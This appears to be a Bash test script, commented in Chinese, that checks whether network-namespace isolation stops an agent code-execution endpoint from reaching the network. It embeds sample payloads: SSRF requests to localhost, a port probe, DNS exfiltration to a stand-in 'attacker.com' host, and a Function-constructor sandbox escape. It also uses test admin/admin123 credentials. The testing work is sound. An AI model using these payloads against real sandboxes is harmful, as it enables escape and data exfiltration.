#!/usr/bin/env bash
# ============================================================================
# 第十二轮审查修复验证脚本：Linux 容器下 netns 隔离真实生效检查
#
# 覆盖：
#   [1] 宿主机 unshare -n / -Urn 两条能力路径探测
#   [2] Docker 非 root（appuser uid=1001）下 -Urn 非特权回退验证
#   [3] SSRF：http.get 访问 127.0.0.1:3000 内网服务应被拦截
#   [4] 内网探测：net.connect 端口应被拦截
#   [5] DNS 外带：dns.lookup 解析 attacker.com 应被拦截
#   [6] 逃逸载荷：(()=>{}).constructor('return this["pro"+"cess"]')() 应被拦截
#   [7] 安全代码：2 + 3 这类应正常执行返回 5
#   [8] 代码执行入口：POST /api/agent/execute_code 真实调用链
#
# 用法（在 Linux 容器内）：
#   bash scripts/verify-netns-isolation.sh
# ============================================================================

set -euo pipefail

PASS=0
FAIL=0
SKIP=0
RED=$'\033[0;31m'; GREEN=$'\033[0;32m'; YELLOW=$'\033[0;33m'; CYAN=$'\033[0;36m'; NC=$'\033[0m'

ok()    { PASS=$((PASS+1)); printf "  ${GREEN}✓${NC} %s\n" "$*"; }
bad()   { FAIL=$((FAIL+1)); printf "  ${RED}✗${NC} %s\n" "$*"; }
skip()  { SKIP=$((SKIP+1)); printf "  ${YELLOW}-${NC} %s\n" "$*"; }
section() { printf "\n${CYAN}━━━━ %s ━━━━${NC}\n" "$*"; }

die() { echo "${RED}✗${NC} 依赖缺失：$*"; exit 1; }

command -v node   >/dev/null 2>&1 || die "node"
command -v unshare >/dev/null 2>&1 || die "unshare"
command -v curl    >/dev/null 2>&1 || die "curl"  # 仅 HTTP 入口用，CLI 层脚本不用

# ----------------------------------------------------------------------------
# [0] 环境快照
# ----------------------------------------------------------------------------
section "[0] 环境快照"
printf "  platform    = %s\n" "$(uname -s)"
printf "  container?  = %s\n" "$([[ -f /.dockerenv ]] && echo yes || echo no)"
printf "  user        = %s (%s)\n" "$(whoami)" "$(id -u)"
printf "  capabilities= %s\n" "$(capsh --print 2>/dev/null | head -1 || echo 'n/a')"
printf "  node version= %s\n" "$(node -v)"

# ----------------------------------------------------------------------------
# [1] 能力探测：unshare -n vs -Urn
# ----------------------------------------------------------------------------
section "[1] unshare 能力探测"

probe() {
  local flags="$1" label="$2"
  if unshare $flags node -e 'process.exit(0)' 2>/dev/null; then
    ok  "unshare $flags 可用（$label）"
    echo "$flags"   # 让调用方拿到
    return 0
  else
    skip "unshare $flags 不可用（$label）"
    return 1
  fi
}

USE_FLAGS=""
if probe -n  "root / CAP_SYS_ADMIN 路径"; then
  USE_FLAGS="-n"
elif probe -Urn "非特权用户命名空间路径（Docker appuser）"; then
  USE_FLAGS="-Urn"
else
  echo ""
  echo "${RED}✗ 两个路径都失败 → 按第十二轮设计 CodeExecutorTool 应 fail closed${NC}"
  echo "  但本脚本继续手动用 'unshare -Urn' 兜底跑一遍测试来确认结论。"
  USE_FLAGS="-Urn"
fi
echo "  → 将使用: unshare $USE_FLAGS node --permission ..."

# ----------------------------------------------------------------------------
# [2] 隔离验证：同一载荷在 netns 内外应呈现不同行为
# ----------------------------------------------------------------------------
section "[2] 基础隔离：网络在 netns 内应完全不可达"

# 2a：netns 内 http.get 应抛 EAI_AGAIN / ENOTFOUND / ECONNREFUSED 之外的网络类错误
#     关键：不是"目标不可达"，而是"DNS 根本查不到"（netns 里没有 resolv.conf）
HTTP_OUTSIDE=$(node --permission -e '
  const http = require("http");
  http.get("http://127.0.0.1:9", (r) => { r.resume(); process.exit(0); })
    .on("error", (e) => { console.error("err=" + e.code); process.exit(1); });
' 2>&1) || true

HTTP_INSIDE=$(unshare $USE_FLAGS node --permission -e '
  const http = require("http");
  http.get("http://127.0.0.1:9", (r) => { r.resume(); process.exit(0); })
    .on("error", (e) => { console.error("err=" + e.code); process.exit(1); });
' 2>&1) || true

echo "  宿主机（有网）http.get → exit=$? out=$HTTP_OUTSIDE"
echo "  netns 内       http.get → exit=$? err=$HTTP_INSIDE"
if echo "$HTTP_INSIDE" | grep -qE "EAI_|ENOTFOUND|ECONNREFUSED|EHOSTUNREACH|EPROTO|EAI_AGAIN"; then
  ok  "netns 内 http.get 被网络层拦截（$HTTP_INSIDE）"
else
  bad "netns 内 http.get 未被拦截（返回='$HTTP_INSIDE'，疑似隔离失效）"
fi

# ----------------------------------------------------------------------------
# [3] 第十二轮 P0 载荷实测
# ----------------------------------------------------------------------------
section "[3] SSRF / 内网探测 / DNS 外带 / constructor 链"

run_payload() {
  local name="$1" code="$2"
  echo "  ── $name"
  echo "  code: $(echo "$code" | tr -d '\n')"

  echo ""
  echo "  [无隔离 · 裸 node --permission]（Windows 旧分支就是这条，必须失败才算修复到位）"
  if node --permission -e "$code" 2>&1 | head -5; then
    echo "  exit=0  → ${RED}✗ 裸分支成功了？在 Linux 上裸执行应已被删除；若是在 Windows 跑本脚本请忽略${NC}"
  else
    echo "  exit≠0  → ${GREEN}✓${NC}"
  fi

  echo ""
  echo "  [有隔离 · unshare $USE_FLAGS node --permission]（第十二轮期望：网络类错误；constructor 链抛 ReferenceError）"
  if unshare $USE_FLAGS node --permission -e "$code" 2>&1 | head -5; then
    echo "  exit=0  → ${RED}✗ 隔离未能阻止！${NC}"
    FAIL=$((FAIL+1))
  else
    echo "  exit≠0  → ${GREEN}✓${NC}"
    PASS=$((PASS+1))
  fi
}

# ---- 载荷 1：SSRF 打本地 ----
run_payload "SSRF: http.get 127.0.0.1:3000" \
  'http.get("http://127.0.0.1:3000/", r => { r.resume(); console.log("BODY=" + r.statusCode); })
    .on("error", e => { console.error("ERR=" + e.code); process.exit(2); })'

# ---- 载荷 2：SSRF 打外网 ----
run_payload "SSRF: http.get example.com" \
  'http.get("http://example.com/", r => { r.resume(); console.log("OK=" + r.statusCode); })
    .on("error", e => { console.error("ERR=" + e.code); process.exit(2); })'

# ---- 载荷 3：net.connect 端口探测 ----
run_payload "内网探测: net.connect 127.0.0.1:3000" \
  'require("net").connect(3000, "127.0.0.1", function(){ console.log("CONNECTED"); this.end(); })
    .on("error", e => { console.error("ERR=" + e.code); process.exit(2); })'

# ---- 载荷 4：DNS 外带 ----
run_payload "DNS 外带: dns.lookup 到 attacker.com" \
  'require("dns").lookup("leaked." + Date.now() + ".attacker.com", (e, a) => {
     if (e) console.error("ERR=" + e.code + ":" + e.message); else console.log("RESOLVED=" + a);
     process.exit(e ? 2 : 0);
   })'

# ---- 载荷 5：constructor 链（审查给出的逃逸） ----
run_payload "逃逸: (()=>{}).constructor 拼接拿 process" \
  'var g = (()=>{}).constructor("return this[\"pro\"+\"cess\"]")(); console.log("HAS_PROCESS=" + !!g); console.log(Object.keys(g).slice(0,5))'

# ----------------------------------------------------------------------------
# [4] 安全代码：在隔离下仍应正常执行
# ----------------------------------------------------------------------------
section "[4] 安全代码仍可执行"

SAFE_OUT=$(unshare $USE_FLAGS node --permission -e 'console.log(2 + 3)')
echo "  unshare $USE_FLAGS node --permission -e '2+3' → $SAFE_OUT"
[[ "$SAFE_OUT" == "5" ]] && ok "安全数学运算在隔离下正常" || bad "安全运算失败（隔离可能过强）"

SAFE_STR=$(unshare $USE_FLAGS node --permission -e 'console.log("hello".toUpperCase())')
[[ "$SAFE_STR" == "HELLO" ]] && ok "字符串操作正常" || bad "字符串操作失败"

# ----------------------------------------------------------------------------
# [5] API 层真实调用（若后端已在本地启动 3000）
# ----------------------------------------------------------------------------
section "[5] POST /api/agent/execute_code 端到端（需后端已启动）"

if curl -s -o /dev/null -w '%{http_code}' http://localhost:3000/api/health 2>/dev/null | grep -qE '^[23]..$'; then
  echo "  后端存活，开始端到端验证..."

  # 获取管理员 token（测试数据：用户名 admin / admin123；无就跳过）
  TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"admin","password":"admin123"}' 2>/dev/null \
    | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{console.log(JSON.parse(s).token||"")}catch{}})' 2>/dev/null || true)

  if [[ -z "$TOKEN" ]]; then
    skip "无法获取 admin token → 跳过 API 层用例（请先启动后端并确保有 admin/admin123）"
  else
    echo "  [E2E-1] admin 执行安全代码"
    R=$(curl -s -X POST http://localhost:3000/api/agent/execute_code \
      -H "Authorization: Bearer $TOKEN" \
      -H 'Content-Type: application/json' \
      -d '{"code":"2 + 3","language":"javascript"}')
    echo "  body=$R"
    echo "$R" | grep -q "5" && ok "E2E 安全代码返回 5" || bad "E2E 安全代码未返回 5"

    echo ""
    echo "  [E2E-2] SSRF 载荷 → 应被 netns 拦截，后端返回执行错误"
    R=$(curl -s -X POST http://localhost:3000/api/agent/execute_code \
      -H "Authorization: Bearer $TOKEN" \
      -H 'Content-Type: application/json' \
      -d '{"code":"require(\"http\").get(\"http://127.0.0.1:3000/\",r=>{r.resume();console.log(\"OK=\"+r.statusCode)}).on(\"error\",e=>console.log(\"ERR=\"+e.code))","language":"javascript"}')
    echo "  body=$R"
    echo "$R" | grep -qE "执行错误|ERR=|EAI_|ENOTFOUND|ERR=" && ok "E2E SSRF 被拦截" || bad "E2E SSRF 未被拦截"
  fi
else
  skip "localhost:3000 未启动 → 跳过 API 层端到端"
fi

# ----------------------------------------------------------------------------
# 汇总
# ----------------------------------------------------------------------------
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
printf "  ${GREEN}通过 %d${NC}   ${RED}失败 %d${NC}   ${YELLOW}跳过 %d${NC}\n" "$PASS" "$FAIL" "$SKIP"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [[ $FAIL -gt 0 ]]; then
  echo ""
  echo "${RED}请对照第十二轮修复检查：${NC}"
  echo "  • 非 root 容器需 unshare -Urn（不是 -n）"
  echo "  • 后端 CodeExecutorTool 必须走 unshare 分支"
  echo "  • 若在 Windows host 上跑本脚本（WSL 除外），宿主机根本没 unshare → 在真正的 Linux 容器里跑"
  exit 1
fi
